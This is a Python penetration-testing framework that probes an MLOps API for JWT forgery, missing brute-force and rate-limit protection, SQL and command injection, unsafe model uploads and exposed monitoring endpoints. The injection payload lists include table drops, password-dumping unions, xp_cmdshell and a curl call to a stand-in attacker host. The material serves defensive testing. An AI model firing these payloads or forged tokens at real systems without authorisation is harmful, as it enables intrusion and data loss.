import os
import sys
import time
import json
import logging
import argparse
import requests
import subprocess
import jwt
import random
import string
from typing import Dict, List, Any, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger("security-tests")

class SecurityTestResult:
    """Class to store security test results"""
    
    def __init__(self, test_name: str, component: str, severity: str = "low"):
        self.test_name = test_name
        self.component = component
        self.severity = severity
        self.status = "pending"
        self.details = {}
        self.start_time = time.time()
        self.duration = 0
    
    def success(self, message: str = "Test passed", **kwargs):
        """Mark test as successful"""
        self.status = "success"
        self.details = {
            "message": message,
            **kwargs
        }
        self.duration = time.time() - self.start_time
    
    def failure(self, message: str = "Test failed", **kwargs):
        """Mark test as failed (security issue found)"""
        self.status = "failure"
        self.details = {
            "message": message,
            **kwargs
        }
        self.duration = time.time() - self.start_time
    
    def error(self, message: str = "Test error", **kwargs):
        """Mark test as errored (could not complete)"""
        self.status = "error"
        self.details = {
            "message": message,
            **kwargs
        }
        self.duration = time.time() - self.start_time
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert result to dictionary"""
        return {
            "test_name": self.test_name,
            "component": self.component,
            "severity": self.severity,
            "status": self.status,
            "details": self.details,
            "duration_seconds": round(self.duration, 2)
        }
    
    def __str__(self) -> str:
        """String representation of result"""
        status_emoji = {
            "success": "",
            "failure": "",
            "error": "",
            "pending": ""
        }
        
        return f"{status_emoji.get(self.status, '?')} {self.component} - {self.test_name} ({self.severity.upper()}) - {self.details.get('message', '')}"

class PenetrationTestSuite:
    """Base class for all penetration test suites"""
    
    def __init__(self, base_url: str, auth_token: Optional[str] = None):
        self.base_url = base_url
        self.auth_token = auth_token
        self.results: List[SecurityTestResult] = []
        
    def run_all_tests(self) -> List[SecurityTestResult]:
        """Run all test methods in the class"""
        # Find all methods that start with 'test_'
        test_methods = [
            method_name for method_name in dir(self)
            if method_name.startswith('test_') and callable(getattr(self, method_name))
        ]
        
        # Run each test method
        for method_name in test_methods:
            test_method = getattr(self, method_name)
            try:
                logger.info(f"Running security test: {method_name}")
                test_method()
            except Exception as e:
                # Create error result if the test itself errors
                result = SecurityTestResult(
                    test_name=method_name,
                    component=self.__class__.__name__,
                    severity="unknown"
                )
                result.error(f"Test execution failed: {str(e)}", exception=str(e))
                self.results.append(result)
                logger.exception(f"Error running test {method_name}: {e}")
        
        return self.results
    
    def get_headers(self) -> Dict[str, str]:
        """Get default headers including auth token if available"""
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "MLOps-Security-Tests/1.0",
        }
        if self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"
        return headers

class AuthenticationTests(PenetrationTestSuite):
    """Tests targeting authentication mechanisms"""
    
    def test_jwt_token_manipulation(self):
        """Test JWT token manipulation attacks"""
        result = SecurityTestResult(
            test_name="jwt_token_manipulation",
            component="Authentication",
            severity="critical"
        )
        
        try:
            # Step 1: Get a valid token (if not provided)
            if not self.auth_token:
                login_url = urljoin(self.base_url, "/api/v1/token")
                login_data = {
                    "username": os.environ.get("TEST_USERNAME", "test_user"),
                    "password": os.environ.get("TEST_PASSWORD", "test_password")
                }
                
                response = requests.post(login_url, json=login_data)
                if response.status_code != 200:
                    result.error("Failed to obtain JWT token for testing", status_code=response.status_code)
                    self.results.append(result)
                    return
                
                self.auth_token = response.json().get("access_token")
            
            # Step 2: Decode token to get payload
            try:
                token_parts = self.auth_token.split('.')
                if len(token_parts) != 3:
                    result.success("Token format is not standard JWT (could be good)")
                    self.results.append(result)
                    return
                    
                decoded_payload = jwt.decode(self.auth_token, options={"verify_signature": False})
            except Exception as e:
                result.success("Token could not be decoded as JWT (could be good)", error=str(e))
                self.results.append(result)
                return
            
            # Step 3: Test token tampering scenarios
            tampering_tests = [
                self._test_expired_token_accepted,
                self._test_algorithm_none,
                self._test_modified_token_payload
            ]
            
            vulnerabilities = []
            for test_fn in tampering_tests:
                vulnerability = test_fn(decoded_payload)
                if vulnerability:
                    vulnerabilities.append(vulnerability)
            
            if vulnerabilities:
                result.failure(
                    "JWT token validation vulnerabilities found",
                    vulnerabilities=vulnerabilities
                )
            else:
                result.success("JWT token validation passed all tampering tests")
            
        except Exception as e:
            result.error(f"Error during JWT token manipulation test: {str(e)}")
        
        self.results.append(result)
    
    def _test_expired_token_accepted(self, payload: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Test if an expired token is accepted"""
        try:
            # Clone payload and set expiration to past
            modified_payload = {**payload}
            modified_payload["exp"] = int(time.time()) - 3600  # 1 hour ago
            
            # Create forged token with the server's signature - this test is to check if expiry is actually checked
            if "exp" in payload:
                # Use a reasonable key for testing - in real attack would try to guess key or bypass check
                forged_token = jwt.encode(
                    modified_payload, 
                    "test_signing_key_for_security_test",
                    algorithm="HS256"
                )
                
                # Try accessing endpoint with forged token
                headers = self.get_headers()
                headers["Authorization"] = f"Bearer {forged_token}"
                
                # Try a simple GET endpoint that requires auth
                test_url = urljoin(self.base_url, "/api/v1/models")
                response = requests.get(test_url, headers=headers)
                
                if response.status_code < 400:
                    # Token was accepted despite being expired
                    return {
                        "issue": "expired_token_accepted",
                        "description": "Server accepted an expired JWT token",
                        "status_code": response.status_code
                    }
        except Exception as e:
            logger.warning(f"Error in expired token test: {e}")
        
        return None
    
    def _test_algorithm_none(self, payload: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Test if 'none' algorithm is accepted"""
        try:
            # Try to forge token with 'none' algorithm
            forged_token = jwt.encode(
                payload,
                "",
                algorithm="none"
            )
            
            # Remove signature part if still present
            parts = forged_token.split('.')
            if len(parts) > 2:
                forged_token = f"{parts[0]}.{parts[1]}."
            
            # Try accessing endpoint with alg=none token
            headers = self.get_headers()
            headers["Authorization"] = f"Bearer {forged_token}"
            
            test_url = urljoin(self.base_url, "/api/v1/models")
            response = requests.get(test_url, headers=headers)
            
            if response.status_code < 400:
                return {
                    "issue": "algorithm_none_accepted",
                    "description": "Server accepted JWT with 'none' algorithm",
                    "status_code": response.status_code
                }
        except Exception as e:
            logger.warning(f"Error in algorithm none test: {e}")
        
        return None
    
    def _test_modified_token_payload(self, payload: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Test if modified payload is accepted with invalid signature"""
        try:
            # Clone payload and try to escalate privileges
            modified_payload = {**payload}
            
            # Try to add admin role if not present
            if "roles" in modified_payload and isinstance(modified_payload["roles"], list):
                if "admin" not in modified_payload["roles"]:
                    modified_payload["roles"].append("admin")
            else:
                modified_payload["roles"] = ["admin"]
            
            # Forge token with invalid signature
            forged_token = jwt.encode(
                modified_payload,
                "invalid_key_for_testing",
                algorithm="HS256"
            )
            
            # Try accessing admin endpoint with forged admin token
            headers = self.get_headers()
            headers["Authorization"] = f"Bearer {forged_token}"
            
            # Try accessing admin endpoint
            test_url = urljoin(self.base_url, "/api/v1/admin/users")
            response = requests.get(test_url, headers=headers)
            
            if response.status_code < 400:
                return {
                    "issue": "invalid_signature_accepted",
                    "description": "Server accepted JWT with invalid signature",
                    "status_code": response.status_code,
                    "response_snippet": response.text[:200]
                }
        except Exception as e:
            logger.warning(f"Error in payload modification test: {e}")
        
        return None
    
    def test_brute_force_protection(self):
        """Test if the API has protection against brute force attacks"""
        result = SecurityTestResult(
            test_name="brute_force_protection",
            component="Authentication",
            severity="high"
        )
        
        login_url = urljoin(self.base_url, "/api/v1/token")
        login_data = {
            "username": os.environ.get("TEST_USERNAME", "test_user"),
            "password": "wrong_password"  # Intentionally wrong
        }
        
        MAX_ATTEMPTS = 10
        THRESHOLD_FAILURES = 8  # How many failures before we expect lockout
        
        try:
            responses = []
            
            # Make multiple login attempts with wrong password
            for i in range(MAX_ATTEMPTS):
                response = requests.post(
                    login_url, 
                    json={**login_data, "password": f"wrong_password_{i}"}
                )
                responses.append({
                    "attempt": i + 1,
                    "status_code": response.status_code,
                    "headers": dict(response.headers)
                })
                
                # If we see 429 or similar rate limiting response, that's good
                if response.status_code == 429:
                    result.success(
                        "Brute force protection detected (rate limiting after multiple attempts)",
                        attempts_before_lockout=i + 1,
                        responses=responses
                    )
                    self.results.append(result)
                    return
            
            # Check if all responses were identical
            all_status_codes = [r["status_code"] for r in responses]
            if all(code == all_status_codes[0] for code in all_status_codes):
                result.failure(
                    "No brute force protection detected (all responses identical)",
                    responses=responses
                )
            else:
                # Check if there's evidence of increasing delays or other protections
                has_increasing_headers = False
                for header in ["X-RateLimit-Remaining", "Retry-After"]:
                    values = [int(r["headers"].get(header, 0)) for r in responses if header in r["headers"]]
                    if values and (sorted(values) == values or sorted(values, reverse=True) == values):
                        has_increasing_headers = True
                
                if has_increasing_headers:
                    result.success(
                        "Brute force protection detected (rate limit headers with increasing/decreasing values)",
                        responses=responses
                    )
                else:
                    result.failure(
                        "Insufficient brute force protection detected",
                        responses=responses
                    )
        except Exception as e:
            result.error(f"Error during brute force protection test: {str(e)}")
        
        self.results.append(result)

class InjectionTests(PenetrationTestSuite):
    """Tests targeting injection vulnerabilities"""
    
    def test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        result = SecurityTestResult(
            test_name="sql_injection",
            component="API",
            severity="critical"
        )
        
        # Common SQL injection payloads
        sql_payloads = [
            "1' OR '1'='1",
            "1; DROP TABLE models; --",
            "' UNION SELECT username,password FROM users; --",
            "'; exec xp_cmdshell('dir'); --",
            "1' OR 1=1; --",
            "test' OR name LIKE '%",
            "test\"; SELECT pg_sleep(5); --",
            "test' AND (SELECT COUNT(*) FROM pg_tables) > 0; --"
        ]
        
        vulnerable_endpoints = []
        
        # Define endpoints to test (with parameters)
        endpoints_to_test = [
            # GET endpoints with query parameters
            {"method": "GET", "url": "/api/v1/models", "params": {"name": "{payload}"}},
            {"method": "GET", "url": "/api/v1/models/{payload}", "params": {}},
            
            # POST endpoints with JSON body
            {"method": "POST", "url": "/api/v1/predict", "json": {"model_id": "{payload}", "features": [1.0]}},
            {"method": "POST", "url": "/api/v1/models", "json": {"name": "{payload}", "description": "Test"}}
        ]
        
        try:
            # Test each endpoint with each payload
            for endpoint in endpoints_to_test:
                for payload in sql_payloads:
                    # Skip test if we don't have auth for protected endpoints
                    if not self.auth_token and endpoint["url"] != "/api/v1/token":
                        continue
                    
                    # Replace placeholders with payload
                    url = endpoint["url"]
                    if "{payload}" in url:
                        url = url.replace("{payload}", payload)
                    
                    headers = self.get_headers()
                    
                    try:
                        if endpoint["method"] == "GET":
                            # Replace parameters with payload
                            params = {}
                            for k, v in endpoint["params"].items():
                                params[k] = v.replace("{payload}", payload) if isinstance(v, str) else v
                            
                            response = requests.get(
                                urljoin(self.base_url, url), 
                                headers=headers,
                                params=params
                            )
                        elif endpoint["method"] == "POST":
                            # Replace JSON values with payload
                            json_data = {}
                            for k, v in endpoint["json"].items():
                                if isinstance(v, str) and "{payload}" in v:
                                    json_data[k] = v.replace("{payload}", payload)
                                else:
                                    json_data[k] = v
                            
                            response = requests.post(
                                urljoin(self.base_url, url), 
                                headers=headers,
                                json=json_data
                            )
                        
                        # Check for SQL error messages in response
                        sql_error_patterns = [
                            "SQL syntax",
                            "syntax error",
                            "ORA-",
                            "MySQL",
                            "PostgreSQL",
                            "SQLite",
                            "unclosed quotation mark",
                            "unterminated quoted string",
                            "quoted string not properly terminated"
                        ]
                        
                        response_text = response.text.lower()
                        found_patterns = [p for p in sql_error_patterns if p.lower() in response_text]
                        
                        if found_patterns:
                            vulnerable_endpoints.append({
                                "endpoint": endpoint["url"],
                                "method": endpoint["method"],
                                "payload": payload,
                                "error_patterns": found_patterns,
                                "status_code": response.status_code,
                                "response_snippet": response.text[:200]
                            })
                    
                    except Exception as e:
                        logger.warning(f"Error testing {endpoint['url']} with {payload}: {e}")
            
            if vulnerable_endpoints:
                result.failure(
                    f"SQL injection vulnerabilities found in {len(vulnerable_endpoints)} endpoints",
                    vulnerable_endpoints=vulnerable_endpoints
                )
            else:
                result.success("No SQL injection vulnerabilities detected")
            
        except Exception as e:
            result.error(f"Error during SQL injection test: {str(e)}")
        
        self.results.append(result)
    
    def test_command_injection(self):
        """Test for command injection vulnerabilities"""
        result = SecurityTestResult(
            test_name="command_injection",
            component="API",
            severity="critical"
        )
        
        # Command injection payloads
        cmd_payloads = [
            "$(sleep 5)",
            "`sleep 5`",
            "| sleep 5",
            "; sleep 5",
            "& sleep 5",
            "&& sleep 5",
            "test || sleep 5",
            "$(curl http://attacker.com)",
            "; ping -c 3 127.0.0.1;",
            "'; ping -c 3 127.0.0.1; '"
        ]
        
        vulnerable_endpoints = []
        
        # Define endpoints to test (with parameters)
        endpoints_to_test = [
            {"method": "POST", "url": "/api/v1/process", "json": {"command": "{payload}"}},
            {"method": "POST", "url": "/api/v1/execute", "json": {"script_name": "{payload}"}},
            {"method": "POST", "url": "/api/v1/shell", "json": {"args": ["{payload}"]}},
            {"method": "POST", "url": "/api/v1/models", "json": {"name": "{payload}", "description": "Test"}},
            {"method": "POST", "url": "/api/v1/data/import", "json": {"source": "{payload}"}}
        ]
        
        try:
            for endpoint in endpoints_to_test:
                for payload in cmd_payloads:
                    # Skip test if we don't have auth for protected endpoints
                    if not self.auth_token and endpoint["url"] != "/api/v1/token":
                        continue
                    
                    headers = self.get_headers()
                    url = urljoin(self.base_url, endpoint["url"])
                    
                    # Replace payload in json data
                    json_data = {}
                    for k, v in endpoint["json"].items():
                        if isinstance(v, str) and "{payload}" in v:
                            json_data[k] = v.replace("{payload}", payload)
                        elif isinstance(v, list):
                            json_data[k] = [i.replace("{payload}", payload) if isinstance(i, str) and "{payload}" in i else i for i in v]
                        else:
                            json_data[k] = v
                    
                    # Measure response time to detect time-based injection
                    start_time = time.time()
                    
                    try:
                        response = requests.post(url, headers=headers, json=json_data, timeout=10)
                        response_time = time.time() - start_time
                        
                        # Check for time-based injection (sleep command executed)
                        # If response takes significantly longer than baseline, may indicate successful injection
                        if response_time > 4.5:  # Sleep 5 in payloads
                            vulnerable_endpoints.append({
                                "endpoint": endpoint["url"],
                                "method": endpoint["method"],
                                "payload": payload,
                                "response_time": response_time,
                                "status_code": response.status_code,
                                "response_snippet": response.text[:200]
                            })
                    except requests.Timeout:
                        # Timeout could also indicate successful command injection
                        vulnerable_endpoints.append({
                            "endpoint": endpoint["url"],
                            "method": endpoint["method"],
                            "payload": payload,
                            "response_time": "timeout",
                            "issue": "Request timed out - potentially successful injection",
                        })
                    except Exception as e:
                        logger.warning(f"Error testing {endpoint['url']} with {payload}: {e}")
            
            if vulnerable_endpoints:
                result.failure(
                    f"Command injection vulnerabilities found in {len(vulnerable_endpoints)} endpoints",
                    vulnerable_endpoints=vulnerable_endpoints
                )
            else:
                result.success("No command injection vulnerabilities detected")
            
        except Exception as e:
            result.error(f"Error during command injection test: {str(e)}")
        
        self.results.append(result)

class RateLimitingTests(PenetrationTestSuite):
    """Tests targeting rate limiting mechanisms"""
    
    def test_rate_limit_bypass(self):
        """Test if rate limiting can be bypassed"""
        result = SecurityTestResult(
            test_name="rate_limit_bypass",
            component="API Gateway",
            severity="high"
        )
        
        # Endpoint to test rate limiting on
        test_url = urljoin(self.base_url, "/api/v1/models")
        
        # Number of requests to make in test
        NUM_REQUESTS = 50
        
        # Store responses for analysis
        responses = []
        
        try:
            # Make multiple requests to trigger rate limiting
            for i in range(NUM_REQUESTS):
                headers = self.get_headers()
                
                # For every third request, try to bypass with modified headers
                if i % 3 == 0:
                    # Try common headers used to identify clients
                    headers["X-Forwarded-For"] = f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}"
                    headers["X-Real-IP"] = f"10.0.{random.randint(1, 255)}.{random.randint(1, 255)}"
                    headers["User-Agent"] = f"Mozilla/5.0 (Test/{i})"
                
                response = requests.get(test_url, headers=headers)
                
                responses.append({
                    "request_num": i + 1,
                    "status_code": response.status_code,
                    "headers": {
                        k: v for k, v in response.headers.items() 
                        if k.lower() in [
                            "x-ratelimit-remaining", 
                            "x-ratelimit-limit",
                            "retry-after",
                            "x-ratelimit-reset"
                        ]
                    }
                })
                
                # Break if we've already hit rate limiting
                if response.status_code == 429:
                    break
            
            # Analyze responses to check for rate limiting
            rate_limited = any(r["status_code"] == 429 for r in responses)
            
            if not rate_limited:
                result.failure(
                    "No rate limiting detected after multiple requests",
                    requests_made=len(responses)
                )
                self.results.append(result)
                return
            
            # Check if we found any bypass
            successful_requests = 0
            blocked_requests = 0
            
            for i in range(len(responses)):
                if responses[i]["status_code"] == 429:
                    blocked_requests += 1
                else:
                    successful_requests += 1
                    # Check if this successful request came after a block
                    if i > 0 and responses[i-1]["status_code"] == 429:
                        result.failure(
                            "Rate limit bypass detected - request succeeded after being rate limited",
                            bypass_found_at_request=i + 1,
                            previous_request=responses[i-1],
                            bypass_request=responses[i]
                        )
                        self.results.append(result)
                        return
            
            # If we got here, rate limiting was properly enforced
            result.success(
                "Rate limiting properly enforced and could not be bypassed",
                successful_requests=successful_requests,
                blocked_requests=blocked_requests
            )
            
        except Exception as e:
            result.error(f"Error during rate limit bypass test: {str(e)}")
        
        self.results.append(result)

class ModelSecurityTests(PenetrationTestSuite):
    """Tests targeting ML model security"""
    
    def test_model_input_validation(self):
        """Test if model endpoints properly validate input"""
        result = SecurityTestResult(
            test_name="model_input_validation",
            component="Model Service",
            severity="high"
        )
        
        predict_url = urljoin(self.base_url, "/api/v1/predict")
        
        # Prepare malicious/invalid inputs
        test_payloads = [
            # Empty features
            {"model_id": "valid-model", "features": []},
            
            # Wrong data types
            {"model_id": "valid-model", "features": ["string", "instead", "of", "numbers"]},
            {"model_id": "valid-model", "features": {"a": 1, "b": 2}},  # Object instead of array
            
            # Extremely large values
            {"model_id": "valid-model", "features": [1e30, 1e30, 1e30]},
            
            # Extremely long array
            {"model_id": "valid-model", "features": [1.0] * 10000},
            
            # Special values
            {"model_id": "valid-model", "features": [float('nan'), float('inf'), -float('inf')]},
            
            # SQL injection in model_id
            {"model_id": "1' OR 1=1; --", "features": [1.0, 2.0]},
            
            # Missing required fields
            {"features": [1.0, 2.0]},
            {"model_id": "valid-model"}
        ]
        
        try:
            validation_issues = []
            
            for idx, payload in enumerate(test_payloads):
                headers = self.get_headers()
                
                try:
                    response = requests.post(predict_url, headers=headers, json=payload)
                    
                    # If response is 200 OK with a problematic payload, that's a vulnerability
                    if response.status_code == 200:
                        validation_issues.append({
                            "payload": payload,
                            "issue": "Server accepted invalid input",
                            "status_code": response.status_code,
                            "response_snippet": response.text[:200]
                        })
                        continue
                    
                    # Check if error is properly reported with right status code
                    # 400 range is expected for validation errors
                    if response.status_code < 400 or response.status_code >= 500:
                        validation_issues.append({
                            "payload": payload,
                            "issue": f"Wrong status code for invalid input: {response.status_code}",
                            "status_code": response.status_code,
                            "response_snippet": response.text[:200]
                        })
                        
                except Exception as e:
                    logger.warning(f"Error testing input validation with payload {idx}: {e}")
            
            if validation_issues:
                result.failure(
                    f"Input validation issues found in {len(validation_issues)} test cases",
                    validation_issues=validation_issues
                )
            else:
                result.success("Model service properly validates all inputs")
                
        except Exception as e:
            result.error(f"Error during model input validation test: {str(e)}")
        
        self.results.append(result)
    
    def test_model_poisoning(self):
        """Test if model uploads are properly validated to prevent poisoning"""
        result = SecurityTestResult(
            test_name="model_poisoning",
            component="Model Registry",
            severity="critical"
        )
        
        # URL for uploading models
        upload_url = urljoin(self.base_url, "/api/v1/models/upload")
        
        try:
            # Test 1: Create a malicious pickle file (simplified for testing)
            malicious_pickle = (
                b'\x80\x04\x95\x1a\x00\x00\x00\x00\x00\x00\x00\x8c\x08'
                b'__main__\x94\x8c\x06system\x94\x93\x94.'
            )  # This is not actually a working exploit but simulates one
            
            # Test 2: Create oversized file
            large_file_size = 100 * 1024 * 1024  # 100MB
            large_file = b'x' * large_file_size
            
            # Test file uploads
            test_cases = [
                {
                    "name": "malicious_pickle_test",
                    "file_content": malicious_pickle,
                    "filename": "malicious_model.pkl",
                    "content_type": "application/octet-stream"
                },
                {
                    "name": "oversized_file_test",
                    "file_content": large_file,
                    "filename": "large_model.h5",
                    "content_type": "application/octet-stream"
                }
            ]
            
            security_issues = []
            
            for test_case in test_cases:
                headers = self.get_headers()
                # Remove content-type as it will be set by the file upload
                if "Content-Type" in headers:
                    del headers["Content-Type"]
                
                files = {
                    'model_file': (
                        test_case["filename"], 
                        test_case["file_content"], 
                        test_case["content_type"]
                    )
                }
                
                data = {
                    'name': test_case["name"],
                    'version': '1.0.0',
                    'description': 'Security test - please ignore'
                }
                
                try:
                    response = requests.post(upload_url, headers=headers, files=files, data=data)
                    
                    # Success response for malicious file upload is a security issue
                    if response.status_code < 400:
                        security_issues.append({
                            "test_case": test_case["name"],
                            "filename": test_case["filename"],
                            "issue": "Server accepted potentially malicious file",
                            "status_code": response.status_code,
                            "response": response.text[:200]
                        })
                except requests.exceptions.RequestException as e:
                    # Connection error might be expected for large file test (timeout/connection reset)
                    if test_case["name"] != "oversized_file_test":
                        logger.warning(f"Error in model upload test {test_case['name']}: {e}")
            
            if security_issues:
                result.failure(
                    f"Model poisoning vulnerabilities found in {len(security_issues)} tests",
                    security_issues=security_issues
                )
            else:
                result.success("Model registry properly validates uploads")
            
        except Exception as e:
            result.error(f"Error during model poisoning test: {str(e)}")
        
        self.results.append(result)

class MonitoringSecurityTests(PenetrationTestSuite):
    """Tests targeting monitoring infrastructure security"""
    
    def test_monitoring_access_control(self):
        """Test if monitoring endpoints have proper access controls"""
        result = SecurityTestResult(
            test_name="monitoring_access_control",
            component="Monitoring",
            severity="medium"
        )
        
        # Common monitoring endpoints to test
        monitoring_endpoints = [
            "/metrics",                    # Prometheus metrics
            "/api/v1/metrics",             # Custom metrics API
            "/debug/pprof",                # Go profiling 
            "/actuator",                   # Spring Boot actuator
            "/actuator/health",            # Spring health check
            "/actuator/metrics",           # Spring metrics
            "/api/v1/health",              # Health check API
            "/admin",                      # Admin interface
            "/api/v1/monitoring/logs",     # Logs API
            "/opentelemetry",              # OpenTelemetry endpoint
        ]
        
        try:
            exposed_endpoints = []
            
            for endpoint in monitoring_endpoints:
                # Try without auth token first
                headers_no_auth = {h: v for h, v in self.get_headers().items() if h != "Authorization"}
                
                try:
                    url = urljoin(self.base_url, endpoint)
                    response = requests.get(url, headers=headers_no_auth)
                    
                    # If endpoint returns success without auth, that's a vulnerability
                    if response.status_code < 400:
                        exposed_endpoints.append({
                            "endpoint": endpoint,
                            "status_code": response.status_code,
                            "content_type": response.headers.get("Content-Type"),
                            "response_size": len(response.content),
                            "issue": "Accessible without authentication"
                        })
                except Exception as e:
                    logger.debug(f"Error accessing {endpoint}: {e}")
                    
            if exposed_endpoints:
                result.failure(
                    f"{len(exposed_endpoints)} monitoring endpoints accessible without authentication",
                    exposed_endpoints=exposed_endpoints
                )
            else:
                result.success("All monitoring endpoints properly secured")
                
        except Exception as e:
            result.error(f"Error during monitoring access control test: {str(e)}")
            
        self.results.append(result)
    
    def test_sensitive_data_exposure(self):
        """Test if monitoring endpoints expose sensitive data"""
        result = SecurityTestResult(
            test_name="sensitive_data_exposure",
            component="Monitoring",
            severity="high"
        )
        
        # Endpoints to check for sensitive data
        endpoints_to_check = [
            "/api/v1/health",
            "/metrics",
            "/actuator/health",
            "/api/v1/status",
            "/debug/vars"
        ]
        
        # Patterns indicating sensitive data
        sensitive_patterns = [
            r"password",
            r"secret",
            r"key",
            r"token",
            r"auth",
            r"credential",
            r"aws_access_key",
            r"private_key",
            r"ssh[-_]key",
            r"jdbc:.*password",
            r"basic [a-zA-Z0-9+/=]+"  # Base64 encoded Basic auth
        ]
        
        try:
            data_exposures = []
            
            for endpoint in endpoints_to_check:
                headers = self.get_headers()
                
                try:
                    url = urljoin(self.base_url, endpoint)
                    response = requests.get(url, headers=headers)
                    
                    if response.status_code >= 400:
                        continue
                    
                    # Check response for sensitive patterns
                    response_text = response.text.lower()
                    
                    for pattern in sensitive_patterns:
                        import re
                        matches = re.findall(pattern, response_text, re.IGNORECASE)
                        if matches:
                            # Don't include the actual sensitive data in the report
                            data_exposures.append({
                                "endpoint": endpoint,
                                "pattern": pattern,
                                "matches_count": len(matches),
                                "status_code": response.status_code
                            })
                except Exception as e:
                    logger.debug(f"Error checking {endpoint} for sensitive data: {e}")
            
            if data_exposures:
                result.failure(
                    f"Sensitive data exposure found in {len(data_exposures)} cases",
                    data_exposures=data_exposures
                )
            else:
                result.success("No sensitive data exposure detected in monitoring endpoints")
        
        except Exception as e:
            result.error(f"Error during sensitive data exposure test: {str(e)}")
        
        self.results.append(result)

def run_security_tests(base_url: str, auth_token: Optional[str] = None) -> Dict[str, Any]:
    """Run all security test suites"""
    logger.info(f"Starting security tests against {base_url}")
    
    if not auth_token:
        logger.warning("No auth token provided - some tests will be limited")
    
    # Create instances of test suites
    test_suites = [
        AuthenticationTests(base_url, auth_token),
        InjectionTests(base_url, auth_token),
        RateLimitingTests(base_url, auth_token),
        ModelSecurityTests(base_url, auth_token),
        MonitoringSecurityTests(base_url, auth_token),
    ]
    
    all_results = []
    for suite in test_suites:
        suite_name = suite.__class__.__name__
        logger.info(f"Running test suite: {suite_name}")
        results = suite.run_all_tests()
        all_results.extend(results)
        
        # Log test results summary
        success_count = sum(1 for r in results if r.status == "success")
        failure_count = sum(1 for r in results if r.status == "failure")
        error_count = sum(1 for r in results if r.status == "error")
        
        logger.info(f"Test suite {suite_name} completed: {success_count} passed, {failure_count} failed, {error_count} errors")
    
    # Create report
    report = {
        "summary": {
            "total_tests": len(all_results),
            "passed": sum(1 for r in all_results if r.status == "success"),
            "failed": sum(1 for r in all_results if r.status == "failure"),
            "errors": sum(1 for r in all_results if r.status == "error"),
            "target_url": base_url,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        },
        "results": [r.to_dict() for r in all_results],
        "vulnerabilities": [
            r.to_dict() for r in all_results 
            if r.status == "failure"
        ],
    }
    
    # Calculate overall security score (0-100)
    total_weight = sum(
        2 if r.severity == "critical" else 
        1.5 if r.severity == "high" else 
        1 if r.severity == "medium" else 
        0.5 
        for r in all_results
    )
    
    failed_weight = sum(
        2 if r.severity == "critical" else 
        1.5 if r.severity == "high" else 
        1 if r.severity == "medium" else 
        0.5 
        for r in all_results if r.status == "failure"
    )
    
    security_score = int(100 * (1 - (failed_weight / total_weight if total_weight > 0 else 0)))
    report["summary"]["security_score"] = security_score
    
    # Determine risk level
    if security_score >= 90:
        risk_level = "Low"
    elif security_score >= 70:
        risk_level = "Medium"
    elif security_score >= 50:
        risk_level = "High"
    else:
        risk_level = "Critical"
    
    report["summary"]["risk_level"] = risk_level
    
    # Print report summary
    logger.info(f"Security testing completed. Score: {security_score}/100 (Risk: {risk_level})")
    logger.info(f"Total tests: {report['summary']['total_tests']}, "
                f"Passed: {report['summary']['passed']}, "
                f"Failed: {report['summary']['failed']}, "
                f"Errors: {report['summary']['errors']}")
    
    if report["vulnerabilities"]:
        logger.warning(f"Found {len(report['vulnerabilities'])} vulnerabilities!")
        for vuln in report["vulnerabilities"]:
            logger.warning(f"- [{vuln['severity'].upper()}] {vuln['component']} - {vuln['test_name']}")
    
    return report

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MLOps Platform Security Testing Framework")
    parser.add_argument("--url", required=True, help="Base URL of the API to test")
    parser.add_argument("--token", help="Authentication token for protected endpoints")
    parser.add_argument("--output", help="Output file for security report (JSON format)")
    
    args = parser.parse_args()
    
    # Run security tests
    report = run_security_tests(args.url, args.token)
    
    # Save report to file if specified
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(report, f, indent=2)
        print(f"Security report saved to {args.output}")